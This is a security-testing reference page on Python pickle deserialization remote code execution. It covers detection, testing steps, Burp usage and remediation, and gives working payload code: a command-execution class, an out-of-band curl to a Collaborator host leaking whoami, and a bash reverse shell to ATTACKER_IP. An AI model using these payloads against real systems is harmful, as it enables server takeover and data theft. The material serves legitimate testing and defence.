# Python Pickle Deserialization (RCE)

## Overview
Python's `pickle` module serializes and deserializes Python objects. Pickle is inherently unsafe with untrusted data — it can execute arbitrary Python code during deserialization via `__reduce__` or `__reduce_ex__` methods. Any application that deserializes user-controlled pickle data is directly vulnerable to Remote Code Execution with no gadget chains required.

## How It Works
- `pickle.loads(data)` directly executes the `__reduce__` method of the pickled object.
- A malicious pickle payload defines `__reduce__` to return `(os.system, ("command",))`.
- When deserialized, Python calls `os.system("command")` — arbitrary OS command execution.
- Unlike PHP, no gadget chain is needed — pickle is inherently executable.
- Commonly found in ML/data science applications, caching layers (Redis with pickle), and session stores.

## Impact
- Direct Remote Code Execution — any OS command.
- Full server compromise.
- Data exfiltration, backdoor installation, lateral movement.
- DoS via resource exhaustion.

## Where to Look
- HTTP cookies or headers containing base64 data (decode and check for `\x80\x02` pickle header).
- API endpoints that accept serialized Python objects.
- Machine learning model serving APIs (model files are pickles — check for deserialization of user-provided models).
- Redis, Memcached cache layers storing Python objects.
- Celery task queues with pickle serialization (was the default pre-4.0).
- Flask session cookies using pickle (rare but exists in older setups).

## Testing Steps
1. Look for base64-encoded values in cookies and POST bodies.
2. Decode and check for pickle magic bytes: `\x80\x02` or `\x80\x04` or `\x80\x05`.
3. Generate a pickle payload with a benign command (e.g., `sleep 5`) for blind confirmation.
4. Test with an out-of-band DNS request via Burp Collaborator.
5. If confirmed, generate a reverse shell or command injection payload.

## Payloads / Techniques
```python
import pickle
import os
import base64

# Generate a malicious pickle payload
class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())

# Payload that sends data via DNS (blind OOB)
class OOBExploit:
    def __reduce__(self):
        cmd = "curl http://COLLABORATOR.burpcollaborator.net/$(whoami)"
        return (os.system, (cmd,))

payload = pickle.dumps(OOBExploit())
print(base64.b64encode(payload).decode())

# Reverse shell payload
class RShell:
    def __reduce__(self):
        import subprocess
        cmd = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
        return (subprocess.check_output, (["bash", "-c", cmd],))

payload = pickle.dumps(RShell())
b64 = base64.b64encode(payload).decode()
print(f"Payload (b64): {b64}")
```

```bash
# Check if a value is a pickle payload
echo "YOUR_COOKIE_VALUE" | base64 -d | xxd | head -2
# Pickle magic bytes: 80 02 (protocol 2), 80 04 (protocol 4), 80 05 (protocol 5)
# Or starts with: . c o s \n

# Send the payload
curl -s https://target.com/api/deserialize \
  -H "Cookie: session=MALICIOUS_B64_PAYLOAD" \
  -H "Content-Type: application/json"

# Using pickletools for analysis
python3 -c "
import pickletools, base64
data = base64.b64decode('YOUR_B64_COOKIE')
pickletools.dis(data)
"
```

## Burp Suite Tips
- Decode base64 cookies in **Burp Decoder** and look for pickle magic bytes (`\x80\x02`).
- Send pickle payloads via **Repeater** by base64-encoding and placing in the cookie/parameter.
- Use **Burp Collaborator** for OOB confirmation — generate a payload that resolves a Collaborator subdomain.
- **Active Scanner** (Pro) may detect binary deserialization format issues.

## Tools
- Python stdlib (pickle, pickletools) for payload generation
- fickling — https://github.com/trailofbits/fickling (pickle security analysis)
- Burp Collaborator for OOB testing

## Remediation
- Never deserialize pickle data from untrusted sources.
- Use JSON, MessagePack, or Protocol Buffers instead of pickle for API data.
- If pickle is required (e.g., for ML models), implement HMAC-SHA256 signature verification before deserialization.
- Use `RestrictedUnpickler` to whitelist allowed classes:
  ```python
  import io, pickle
  class RestrictedUnpickler(pickle.Unpickler):
      def find_class(self, module, name):
          if module == "builtins" and name in ("int", "float", "str", "list", "dict"):
              return super().find_class(module, name)
          raise pickle.UnpicklingError(f"global '{module}.{name}' is forbidden")
  ```
- For Celery: configure `task_serializer = 'json'` (not `pickle`).

## References
https://portswigger.net/web-security/deserialization
https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
https://github.com/trailofbits/fickling
https://davidhamann.de/2020/04/05/exploiting-python-pickle/
